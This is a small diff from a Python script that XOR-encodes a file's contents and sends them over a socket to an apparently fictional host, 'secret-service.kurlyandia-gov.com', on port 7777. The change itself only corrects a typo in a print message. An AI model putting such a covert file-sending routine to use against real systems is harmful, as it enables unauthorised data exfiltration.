@@ -21,8 +21,8 @@ def main():
             content[i] ^= key[key_index]
             key_index += 1
 
-        print('Send file {} with lenght {}...'.format(filename, len(content)))   
-        
+        print('Send file {} with length {}...'.format(filename, len(content)))
+
         with socket.socket() as conn:
             conn.connect(('secret-service.kurlyandia-gov.com', 7777))
 
